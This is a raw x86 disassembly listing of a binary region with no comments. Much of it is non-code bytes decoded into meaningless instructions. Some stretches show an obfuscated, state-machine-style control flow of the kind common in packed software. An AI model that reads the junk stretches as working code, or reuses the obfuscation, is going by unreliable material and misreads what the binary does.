  40eb06:	je     0x40eb3a
  40eb08:	mov    edi,DWORD PTR [eax+0x43]
  40eb0b:	xchg   DWORD PTR [ebp-0x4b0527fb],eax
  40eb11:	aam    0xd
  40eb13:	retf   
  40eb14:	scas   eax,DWORD PTR es:[edi]
  40eb15:	je     0x40eab5
  40eb17:	outs   dx,BYTE PTR ds:[esi]
  40eb18:	jb     0x40eb35
  40eb1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb1b:	cmp    al,BYTE PTR [ebx-0x2e]
  40eb1e:	popf   
  40eb1f:	jmp    0x40eabb
  40eb21:	clc    
  40eb22:	dec    ecx
  40eb23:	sub    eax,0x7b35533f
  40eb28:	and    BYTE PTR [ebp-0x31d9b75a],ch
  40eb2e:	sbb    al,0x84
  40eb30:	adc    ebp,DWORD PTR [esi]
  40eb32:	mov    ah,0x18
  40eb34:	inc    ebp
  40eb35:	shr    BYTE PTR [ecx-0x61aacb3],1
  40eb3b:	push   ebx
  40eb3c:	mul    esi
  40eb3e:	das    
  40eb3f:	xor    BYTE PTR [esp+eax*2+0x25fcbd5f],0xfb
  40eb47:	adc    DWORD PTR [ecx+0x65],edi
  40eb4a:	adc    al,0x9b
  40eb4c:	aad    0xd2
  40eb4e:	repnz push eax
  40eb50:	js     0x40ebc4
  40eb52:	xlat   BYTE PTR ds:[ebx]
  40eb53:	not    BYTE PTR [edi+0x5b]
  40eb56:	aam    0xe7
  40eb58:	mov    ds:0x32dd56a7,eax
  40eb5d:	mov    ebp,0xb5e856a4
  40eb62:	and    al,0xb
  40eb64:	aaa    
  40eb65:	out    0x35,eax
  40eb67:	xchg   esp,eax
  40eb68:	rcr    BYTE PTR [eax+0x10ff27c0],0x7e
  40eb6f:	xor    al,bh
  40eb71:	xchg   esi,eax
  40eb72:	jge    0x40ebb4
  40eb74:	ret    0x4774
  40eb77:	cmp    ch,BYTE PTR [edx-0x4d33f45e]
  40eb7d:	pop    ss
  40eb7e:	jmp    0x40eb1e
  40eb80:	stos   DWORD PTR es:[edi],eax
  40eb81:	test   BYTE PTR [edx],bh
  40eb83:	sub    al,0x4e
  40eb85:	int3   
  40eb86:	inc    ebp
  40eb87:	add    bl,BYTE PTR [ebp+0x2963042c]
  40eb8d:	call   0x78cb:0x3c0a39d8
  40eb94:	mov    eax,0x5170227c
  40eb99:	jno    0x40eb45
  40eb9b:	jge    0x40ebe8
  40eb9d:	std    
  40eb9e:	jp     0x40ebfe
  40eba0:	int3   
  40eba1:	es cmc 
  40eba3:	add    al,0x6a
  40eba5:	xchg   ecx,eax
  40eba6:	inc    ebp
  40eba7:	stos   DWORD PTR es:[edi],eax
  40eba8:	in     al,0x95
  40ebaa:	mov    ch,0x60
  40ebac:	stos   DWORD PTR es:[edi],eax
  40ebad:	imul   esp,DWORD PTR [edx+esi*2+0x5e],0x8b218923
  40ebb5:	inc    eax
  40ebb6:	mov    dh,0x46
  40ebb8:	jne    0x40ebee
  40ebba:	push   edx
  40ebbb:	push   esi
  40ebbc:	add    al,ch
  40ebbe:	xor    BYTE PTR [eax+eax*1-0x28],dl
  40ebc2:	out    0x69,al
  40ebc4:	enter  0xdf03,0x85
  40ebc8:	das    
  40ebc9:	(bad)  
  40ebca:	jmp    0x4cbe88a7
  40ebcf:	(bad)  
  40ebd0:	sub    edi,DWORD PTR [ecx]
  40ebd2:	outs   dx,BYTE PTR ds:[esi]
  40ebd3:	mov    esp,0x69c4ced2
  40ebd8:	fwait
  40ebd9:	mov    ds:0xa106f6cb,eax
  40ebde:	xor    ch,BYTE PTR [edx+0x78]
  40ebe1:	mov    ds:0xed3acd30,eax
  40ebe6:	in     al,dx
  40ebe7:	sar    DWORD PTR [eax-0x6f],0x82
  40ebeb:	ror    DWORD PTR [ecx-0x710cae32],0xd0
  40ebf2:	pop    esi
  40ebf3:	mov    al,ds:0x2647bc8f
  40ebf8:	test   BYTE PTR [edi-0x7992e790],bh
  40ebfe:	dec    esp
  40ebff:	jns    0x40ebc2
  40ec01:	mov    ebp,0xdb9058ad
  40ec06:	sub    ecx,ebp
  40ec08:	jge    0x40ebdc
  40ec0a:	mov    ds:0x3059e52f,al
  40ec0f:	out    0x34,al
  40ec11:	shr    BYTE PTR [esi+esi*1+0x2ff3ae93],0xa8
  40ec19:	(bad)  
  40ec1b:	imul   ebx,DWORD PTR [ebp+0x1],0x5803a903
  40ec22:	fistp  WORD PTR [ebx+ebp*8+0x542a7570]
  40ec29:	sub    BYTE PTR [eax+0x1f71a844],dl
  40ec2f:	fimul  DWORD PTR [eax+0xedaf78a]
  40ec35:	push   ecx
  40ec36:	ror    DWORD PTR [esi],0x8b
  40ec39:	cmp    BYTE PTR [esi+0x41],al
  40ec3c:	pop    esi
  40ec3d:	fidiv  DWORD PTR [eax-0xaf5610f]
  40ec43:	popa   
  40ec44:	push   ds
  40ec45:	dec    ebp
  40ec46:	mov    esi,0xae7cc1e2
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [esi+esi*4-0x2cf17d],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	mov    ds,WORD PTR [esi-0xa13e92c]
  40ecd2:	(bad)  
  40ecd3:	push   ecx
  40ecd4:	dec    ebx
  40ecd5:	arpl   WORD PTR [esi-0x58],cx
  40ecd8:	fstp   st(1)
  40ecda:	or     al,BYTE PTR [edi]
  40ecdc:	jmp    0x53ca1df9
  40ece1:	ret    
  40ece2:	sbb    eax,0x832a5a0a
  40ece7:	sbb    BYTE PTR [edx],ah
  40ece9:	(bad)
  40ecec:	mov    ebx,esp
  40ecee:	lahf   
  40ecef:	(bad)  
  40ecf0:	pop    ebp
  40ecf1:	mov    bh,0xed
  40ecf3:	fist   DWORD PTR [edi]
  40ecf5:	loop   0x40ed32
  40ecf7:	push   ebx
  40ecf8:	repz add eax,0x7be1b5e6
  40ecfe:	adc    ch,BYTE PTR [esi-0x719f8ba3]
  40ed04:	sbb    al,0xbc
  40ed06:	dec    edx
  40ed07:	sahf   
  40ed08:	ja     0x40eccb
  40ed0a:	int    0x9
  40ed0c:	test   eax,0xa39b1a2b
  40ed11:	push   ebp
  40ed12:	dec    esi
  40ed13:	and    ecx,esp
  40ed15:	out    dx,al
  40ed16:	pop    es
  40ed17:	adc    eax,DWORD PTR [edi]
  40ed19:	xchg   DWORD PTR [esi+0x2c],eax
  40ed1c:	push   ecx
  40ed1d:	and    cl,0x1c
  40ed20:	loopne 0x40ece0
  40ed22:	test   ebp,edx
  40ed24:	(bad)  
  40ed25:	mov    eax,0x604c0a0c
  40ed2a:	inc    esp
  40ed2b:	mov    dh,0x9a
  40ed2d:	lahf   
  40ed2e:	adc    BYTE PTR [ebx-0x16],0x76
  40ed32:	and    bx,bp
  40ed35:	fsubr  QWORD PTR [esi]
  40ed37:	shr    edi,cl
  40ed39:	fldenv [esi-0x6e]
  40ed3c:	xor    al,0xd0
  40ed3e:	shl    esi,0x59
  40ed41:	and    al,0xe
  40ed43:	push   ebx
  40ed44:	or     BYTE PTR [edx-0x4c2734f1],dh
  40ed4a:	(bad)  [ebp+0x611ccdc8]
  40ed50:	and    al,0xa2
  40ed52:	test   BYTE PTR [eax*1+0x7b61c0f9],cl
  40ed59:	loop   0x40ecdd
  40ed5b:	xchg   DWORD PTR ds:0x68b8b2b4,edi
  40ed61:	pop    ss
  40ed62:	scas   al,BYTE PTR es:[edi]
  40ed63:	mov    ds:0x4a5643d5,eax
  40ed68:	jg     0x40ed9b
  40ed6a:	mov    ss,WORD PTR [esi]
  40ed6c:	add    DWORD PTR [edx-0x6b],ecx
  40ed6f:	das    
  40ed70:	bound  ebx,QWORD PTR [ecx-0x71]
  40ed73:	test   ebp,esi
  40ed75:	push   ebp
  40ed76:	push   0x32fd0f0f
  40ed7b:	jnp    0x40ed12
  40ed7d:	xor    DWORD PTR [ebx],ecx
  40ed7f:	pop    ecx
  40ed80:	pop    edx
  40ed81:	push   0xffffffbf
  40ed83:	sar    cl,0x92
  40ed86:	jns    0x40ed8c
  40ed88:	das    
  40ed89:	sbb    DWORD PTR [esp+ecx*1-0x537dc95c],ebp
  40ed90:	and    dl,BYTE PTR [esi+edx*1+0x70]
  40ed94:	stos   DWORD PTR es:[edi],eax
  40ed95:	sub    cl,BYTE PTR [edi-0x6afe7945]
  40ed9b:	mov    ah,0xec
  40ed9d:	js     0x40edb3
  40ed9f:	out    dx,eax
  40eda0:	jge    0x40ed59
  40eda2:	dec    ebp
  40eda3:	jae    0x40edbc
  40eda5:	in     al,dx
  40eda6:	inc    ebx
  40eda7:	(bad)  
  40eda9:	or     BYTE PTR [eax+0x62],dh
  40edac:	cli    
  40edad:	mov    BYTE PTR [ebp+0x68],dl
  40edb0:	inc    esi
  40edb1:	shl    BYTE PTR [edx],cl
  40edb3:	leave  
  40edb4:	push   eax
  40edb5:	sahf   
  40edb6:	call   0xbc8dbb17
  40edbb:	enter  0x449d,0x33
  40edbf:	test   al,0xb
  40edc1:	arpl   bp,cx
  40edc3:	inc    ebp
  40edc4:	mov    al,ds:0x7faf918a
  40edc9:	push   0x691eff75
  40edce:	cmc    
  40edcf:	pop    ss
  40edd0:	pop    ds
  40edd1:	fwait
  40edd2:	lahf   
  40edd3:	or     DWORD PTR [esi+0x0],eax
  40edd6:	jnp    0x40edb4
  40edd8:	popa   
  40edd9:	stos   BYTE PTR es:[edi],al
  40edda:	je     0x40edd7
  40eddc:	dec    esp
  40eddd:	fist   WORD PTR [ebp+eax*8-0xae2e1f0]
  40ede4:	ret    0xb686
  40ede7:	dec    ebp
  40ede8:	ret    0xff0a
  40edeb:	cmp    ecx,ebp
  40eded:	fucomi st,st(6)
  40edef:	push   edi
  40edf0:	ss dec eax
  40edf2:	aaa    
  40edf3:	adc    edi,esi
  40edf5:	mov    bl,0xac
  40edf7:	lods   al,BYTE PTR ds:[esi]
  40edf8:	ret    0xd1fb
  40edfb:	test   eax,0x1f415d3f
  40ee00:	jle    0x40ed9a
  40ee02:	pop    esp
  40ee03:	or     edi,edi
  40ee05:	rep outs dx,DWORD PTR ds:[esi]
  40ee07:	jo     0x40ee78
  40ee09:	pusha  
  40ee0a:	in     eax,dx
  40ee0b:	cvtdq2ps xmm0,XMMWORD PTR [esi-0x5]
  40ee0f:	enter  0x92c1,0x51
  40ee13:	mov    dl,0x44
  40ee15:	jp     0x40ee88
  40ee17:	push   edi
  40ee18:	mov    edi,edx
  40ee1a:	mov    al,BYTE PTR ds:0xc6501e60
  40ee20:	fild   DWORD PTR [ebx+0x137f925c]
  40ee26:	ja     0x40ee4a
  40ee28:	(bad)  [edx+0x5b]
  40ee2b:	jns    0x40ede0
  40ee2d:	mov    ah,0x3e
  40ee2f:	scas   al,BYTE PTR es:[edi]
  40ee30:	int3   
  40ee31:	pop    ss
  40ee32:	add    eax,0x57edd1e7
  40ee37:	mov    eax,0x22308211
  40ee3c:	inc    ecx
  40ee3d:	sub    BYTE PTR [edi+0x3a],0xa2
  40ee41:	call   0xdb04e3cb
  40ee46:	pop    ecx
  40ee47:	xor    al,0xed
  40ee49:	into   
  40ee4a:	aam    0x83
  40ee4c:	fwait
  40ee4d:	mov    dh,0xa8
  40ee4f:	in     eax,0x3a
  40ee51:	sub    al,0x53
  40ee53:	stc    
  40ee54:	sub    DWORD PTR [esi-0x7d],edx
  40ee57:	enter  0xd134,0x10
  40ee5b:	xchg   ebx,eax
  40ee5c:	call   0xd756369b
  40ee61:	pop    es
  40ee62:	std    
  40ee63:	mov    WORD PTR [ebp+0x2c],gs
  40ee66:	data16 (bad) 
  40ee68:	jns    0x40ee82
  40ee6a:	fld    DWORD PTR [ebx-0x2c44debb]
  40ee70:	fsin   
  40ee72:	mov    ch,0x3f
  40ee74:	out    0x8f,al
  40ee76:	cmp    DWORD PTR [eax-0xe22d55e],0x5d313c14
  40ee80:	loope  0x40ee85
  40ee82:	pop    es
  40ee83:	inc    ebp
  40ee84:	in     al,dx
  40ee85:	or     al,0xd8
  40ee87:	jl     0x40ee46
  40ee89:	push   ds
  40ee8a:	mov    al,ds:0xae1ddd04
  40ee8f:	repnz fstp TBYTE PTR [eax+0x63]
  40ee93:	cwde   
  40ee94:	or     DWORD PTR [ebx-0x37],edx
  40ee97:	dec    eax
  40ee98:	xor    al,0x37
  40ee9a:	lds    edi,FWORD PTR [edi+0x6]
  40ee9d:	inc    eax
  40ee9e:	pop    ds
  40ee9f:	int3   
  40eea0:	call   0xfed2331
  40eea5:	das    
  40eea6:	cmp    dl,BYTE PTR [edi-0x5f]
  40eea9:	or     ebp,eax
  40eeab:	xor    DWORD PTR [eax],eax
  40eead:	scas   al,BYTE PTR es:[edi]
  40eeae:	leave  
  40eeaf:	fcomp  QWORD PTR [edi]
  40eeb1:	adc    al,0xc4
  40eeb4:	or     al,0xcf
  40eeb6:	ret    
  40eeb7:	stos   BYTE PTR es:[edi],al
  40eeb8:	push   edx
  40eeb9:	cs stc 
  40eebb:	push   es
  40eebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eebd:	iret   
  40eebe:	mov    ebx,0x74c694d5
  40eec3:	mov    dl,0xea
  40eec5:	or     al,BYTE PTR [ecx-0x6e6e09c2]
  40eecb:	sar    BYTE PTR [ebx-0x34ea3e0d],1
  40eed1:	(bad)  [esi]
  40eed3:	adc    eax,0xac2790c1
  40eed8:	mov    eax,ds:0xe8772875
  40eedd:	popf   
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x3598ef46],0x8f60bf69
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40eea5
  40ef11:	(bad)  
  40ef12:	(bad)  
  40ef14:	cld    
  40ef15:	mov    ebp,0x7883e302
  40ef1a:	call   0x2066:0x419c6b26
  40ef21:	das    
  40ef22:	jnp    0x40efa1
  40ef24:	test   eax,0x8c249255
  40ef29:	sbb    eax,0x4dc784c5
  40ef2e:	in     al,dx
  40ef2f:	mov    dh,BYTE PTR [edi+0x32]
  40ef32:	test   DWORD PTR [ebp-0x3df3447a],edx
  40ef38:	test   DWORD PTR [ebx],ebx
  40ef3a:	and    esp,0x28ac35a8
  40ef40:	ss in  eax,dx
  40ef42:	jne    0x40efaa
  40ef44:	xchg   DWORD PTR fs:[ebx],ecx
  40ef47:	adc    cl,dl
  40ef49:	int3   
  40ef4a:	mov    DWORD PTR [edx+0x3e1b0f0e],ebx
  40ef50:	test   eax,0x1c83fd7b
  40ef55:	cld    
  40ef56:	xchg   edx,eax
  40ef57:	fwait
  40ef58:	icebp  
  40ef59:	(bad)  
  40ef5a:	aaa    
  40ef5b:	mov    bh,0xe8
  40ef5d:	jo     0x40efc3
  40ef5f:	adc    cl,BYTE PTR fs:[ebx]
  40ef62:	aam    0x99
  40ef64:	lods   al,BYTE PTR ds:[esi]
  40ef65:	pop    ss
  40ef66:	sub    ch,BYTE PTR [edx]
  40ef68:	and    esi,ecx
  40ef6a:	jecxz  0x40ef58
  40ef6c:	and    al,0x6c
  40ef6e:	js     0x40ef37
  40ef70:	mov    ebx,0xeb3f72dc
  40ef75:	ror    BYTE PTR ds:0xa7ea5d16,0x72
  40ef7c:	dec    ecx
  40ef7d:	test   eax,0xa7ab94f3
  40ef82:	lea    eax,[ebx]
  40ef84:	pop    eax
  40ef85:	sub    BYTE PTR [ecx+0x37],ah
  40ef88:	xchg   ecx,eax
  40ef89:	inc    ebp
  40ef8a:	adc    eax,0x5800944e
  40ef8f:	sbb    DWORD PTR [esi-0x7fdf0672],ebp
  40ef95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef96:	(bad)  
  40ef97:	idiv   DWORD PTR [ecx]
  40ef99:	aad    0x1a
  40ef9b:	addr16 in eax,0xa8
  40ef9e:	pmuludq mm4,QWORD PTR [esi]
  40efa1:	repnz lods eax,DWORD PTR ds:[esi]
  40efa3:	std    
  40efa4:	(bad)  
  40efa5:	ror    BYTE PTR [eax+0x2f8d238f],1
  40efab:	mov    esi,DWORD PTR [ecx-0x5f]
  40efae:	mov    esi,0x18b2997b
  40efb3:	icebp  
  40efb4:	mov    ah,0xce
  40efb6:	cmp    ebp,DWORD PTR [edi-0x3775323e]
  40efbc:	pop    ds
  40efbd:	sbb    bl,BYTE PTR ds:0x4ac73bf4
  40efc3:	mov    esp,0xef02a74c
  40efc8:	arpl   WORD PTR [edx],di
  40efca:	sbb    BYTE PTR [ecx-0x4e1ff3e0],dl
  40efd0:	mov    ch,0xf7
  40efd2:	push   ebp
  40efd3:	test   edi,edx
  40efd5:	stos   BYTE PTR es:[edi],al
  40efd6:	js     0x40f052
  40efd8:	xchg   esi,eax
  40efd9:	mov    ds:0xfa2b3865,eax
  40efde:	ins    DWORD PTR es:[edi],dx
  40efdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efe0:	and    ch,ah
  40efe2:	xlat   BYTE PTR ds:[ebx]
  40efe3:	test   ch,al
  40efe5:	adc    BYTE PTR [edi-0x65],bl
  40efe8:	sub    al,0x9c
  40efea:	rol    DWORD PTR ss:[ebp+eax*1-0x4c857d92],0x8e
  40eff3:	dec    edx
  40eff4:	dec    edx
  40eff5:	xchg   esi,eax
  40eff6:	icebp  
  40eff7:	xchg   DWORD PTR [eax],esi
  40eff9:	into   
  40effa:	jg     0x40efbf
  40effc:	aas    
  40effd:	adc    dh,BYTE PTR [esi-0x40fdaff1]
  40f003:	(bad)  [edx+0xebd4fd9]
  40f009:	pop    eax
  40f00a:	test   dl,dh
  40f00c:	stc    
  40f00d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f00e:	xor    al,0xa
  40f010:	aas    
  40f011:	or     edx,esp
  40f013:	xchg   ebp,eax
  40f014:	vpshuflw ymm4,YMMWORD PTR [esi+0x72],0xb9
  40f01a:	mov    bl,0xc
  40f01c:	adc    BYTE PTR ds:0xc05c00a7,bh
  40f022:	nop
  40f023:	into   
  40f024:	pop    ecx
  40f025:	shl    bl,cl
  40f027:	dec    eax
  40f028:	sub    ebx,DWORD PTR [ebp+0x186120c]
  40f02e:	(bad)  
  40f02f:	lahf   
  40f030:	aaa    
  40f031:	inc    ecx
  40f032:	in     eax,dx
  40f033:	xchg   ebx,ecx
  40f035:	cli    
  40f036:	sahf   
  40f037:	adc    al,0x9e
  40f039:	mov    ecx,0x883856e2
  40f03e:	pop    ebp
  40f03f:	fadd   QWORD PTR [esi-0xd]
  40f042:	out    0x68,al
  40f044:	cmp    al,0x42
  40f046:	cmp    eax,0x4cf38693
  40f04b:	aam    0x6a
  40f04d:	ret    
  40f04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f04f:	repnz add ah,al
  40f052:	lea    esp,[ecx]
  40f054:	daa    
  40f055:	sub    al,0xd4
  40f057:	xchg   ebp,eax
  40f058:	sbb    eax,0xbab7d520
  40f05d:	jg     0x40f076
  40f05f:	mov    BYTE PTR [eax+0x637dc4e4],al
  40f065:	xor    dl,BYTE PTR [esi]
  40f067:	and    eax,0xf4b5346d
  40f06c:	daa    
  40f06d:	imul   edi,DWORD PTR [edx+0x78719945],0x791ca8b
  40f077:	aaa    
  40f078:	xor    eax,0x620b5264
  40f07d:	xor    eax,0xda1a529c
  40f082:	je     0x40f082
  40f084:	fs dec ebx
  40f086:	fnstsw WORD PTR ds:0x7426931a
  40f08c:	test   al,0x5e
  40f08e:	mov    dh,0x1d
  40f090:	cmc    
  40f091:	adc    DWORD PTR [edx+edi*1+0x414540f3],esp
  40f098:	mov    bl,0x10
  40f09a:	jnp    0x40f100
  40f09c:	pop    edx
  40f09d:	pop    ds
  40f09e:	loop   0x40f0b5
  40f0a0:	adc    esp,ecx
  40f0a2:	push   ds
  40f0a3:	call   0x5bc7:0xd538eba7
  40f0aa:	inc    BYTE PTR [edx+0x517a6d95]
  40f0b0:	push   edx
  40f0b1:	inc    ecx
  40f0b2:	imul   ebx,DWORD PTR [esi-0x46],0xffffffda
  40f0b6:	aas    
  40f0b7:	btc    DWORD PTR [ebx],ecx
  40f0ba:	sub    DWORD PTR [esi],0x808421e3
  40f0c0:	inc    esp
  40f0c1:	or     BYTE PTR [esi+0x6d527113],bl
  40f0c7:	sbb    DWORD PTR [ebp-0x6bcdc3e5],0x39e030e1
  40f0d1:	cmp    DWORD PTR ss:[ebx-0x29],edi
  40f0d5:	loope  0x40f0a0
  40f0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d8:	(bad)  
  40f0d9:	adc    eax,0x3b4defa7
  40f0de:	stos   DWORD PTR es:[edi],eax
  40f0df:	push   ecx
  40f0e0:	xor    BYTE PTR [eax-0x4f43f23d],ah
  40f0e6:	cld    
  40f0e7:	cmc    
  40f0e8:	cdq    
  40f0e9:	jnp    0x40f0cb
  40f0eb:	inc    esp
  40f0ec:	cmp    DWORD PTR cs:[esi-0x43],edi
  40f0f0:	hlt    
  40f0f1:	sbb    eax,edi
  40f0f3:	add    BYTE PTR [esi+edi*4-0x18],dh
  40f0f7:	adc    dh,cl
  40f0f9:	je     0x40f0c5
  40f0fb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0fd:	sti    
  40f0fe:	mov    bh,bl
  40f100:	cmc    
  40f101:	lock sbb eax,0x8bacdba6
  40f107:	and    eax,0x5e67dd3b
  40f10c:	mov    ch,0x38
  40f10e:	out    dx,al
  40f10f:	pop    ds
  40f110:	adc    eax,0x44912a7d
  40f115:	shl    DWORD PTR [eax],0x9a
  40f118:	jnp    0x40f140
  40f11a:	jbe    0x40f0c9
  40f11c:	test   eax,0x813a4338
  40f121:	jmp    DWORD PTR [ebx+0xf000001]
  40f127:	test   DWORD PTR [edi+0x0],ecx
  40f12a:	add    BYTE PTR [eax],al
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx+0x7ba24626]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f261
  40f1e9:	jmp    0x40f1be
  40f1eb:	ficom  WORD PTR ds:0x8bc15aea
  40f1f1:	shl    cl,1
  40f1f3:	xlat   BYTE PTR ds:[ebx]
  40f1f4:	mov    ebp,0x3adf84a2
  40f1f9:	out    0x0,al
  40f1fb:	mov    ds:0xd550ed88,al
  40f200:	xchg   ebx,eax
  40f201:	pop    esp
  40f202:	sub    al,0x15
  40f205:	out    dx,al
  40f206:	sub    edi,ebp
  40f208:	sub    al,0xf6
  40f20a:	out    0xa7,al
  40f20c:	imul   bx,WORD PTR [edi-0x6734145d],0x70
  40f214:	pop    eax
  40f215:	stc    
  40f216:	pop    eax
  40f217:	sub    dl,BYTE PTR [esi+0x5d7a45c7]
  40f21d:	push   ebx
  40f21e:	(bad)  
  40f21f:	sbb    ah,BYTE PTR [ebp+0x47]
  40f222:	ja     0x40f1a6
  40f224:	retf   
  40f225:	and    ecx,esp
  40f227:	xor    DWORD PTR [ecx-0x3933493f],0x88bfea6f
  40f231:	jbe    0x40f28b
  40f233:	icebp  
  40f234:	stos   BYTE PTR es:[edi],al
  40f235:	es pop esp
  40f237:	inc    eax
  40f238:	or     edi,DWORD PTR [edi-0x297380f4]
  40f23e:	fmul   st(7),st
  40f240:	jnp    0x40f221
  40f242:	jo     0x40f2be
  40f244:	pop    eax
  40f245:	or     edi,ecx
  40f247:	mov    ch,0x8f
  40f249:	les    eax,FWORD PTR [esi+esi*1]
  40f24c:	repnz ss push ebx
  40f24f:	xor    ebp,edi
  40f251:	push   0xb6c2d701
  40f256:	ret    
  40f257:	sahf   
  40f258:	inc    esi
  40f259:	sti    
  40f25a:	jge    0x40f25f
  40f25c:	mov    ecx,0x93e8932f
  40f261:	fsubr  QWORD PTR [edx]
  40f263:	dec    esp
  40f264:	push   0x2c
  40f266:	xor    al,0xcd
  40f268:	(bad)  
  40f269:	hlt    
  40f26a:	mov    ss,WORD PTR [eax-0x7a]
  40f26d:	in     eax,dx
  40f26e:	xchg   esi,eax
  40f26f:	(bad)  
  40f270:	lods   eax,DWORD PTR ds:[esi]
  40f271:	ins    BYTE PTR es:[edi],dx
  40f272:	sbb    edi,DWORD PTR [eax]
  40f274:	arpl   WORD PTR [ebx+ebx*2+0x4f],si
  40f278:	mov    BYTE PTR [edi-0x67],ch
  40f27b:	jmp    0x40d2403e
  40f280:	add    ah,BYTE PTR [edi]
  40f282:	aaa    
  40f283:	sub    bh,0x60
  40f286:	and    al,0xa
  40f288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f289:	push   es
  40f28a:	in     eax,dx
  40f28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28c:	mov    ah,0x30
  40f28e:	out    dx,eax
  40f28f:	mov    ebp,0x37bef9f5
  40f294:	xchg   BYTE PTR [eax],ch
  40f296:	fwait
  40f297:	push   esi
  40f298:	add    al,0xfa
  40f29a:	pop    eax
  40f29b:	test   BYTE PTR [ebx+0x72],0xf8
  40f29f:	push   es
  40f2a0:	ins    DWORD PTR es:[edi],dx
  40f2a1:	pop    eax
  40f2a2:	out    0x79,eax
  40f2a4:	cmp    eax,0x47ec9f18
  40f2a9:	or     esp,DWORD PTR [ebp+0x2caab7fc]
  40f2af:	lods   eax,DWORD PTR ds:[esi]
  40f2b0:	inc    ebx
  40f2b1:	ret    0xccb
  40f2b4:	jmp    DWORD PTR [ebp+0x25b730bc]
  40f2ba:	retf   0x4b38
  40f2bd:	imul   ecx,DWORD PTR [edi],0xdf58a8e7
  40f2c3:	ffreep st(7)
  40f2c5:	push   es
  40f2c6:	mov    dh,BYTE PTR [edx]
  40f2c8:	push   ebx
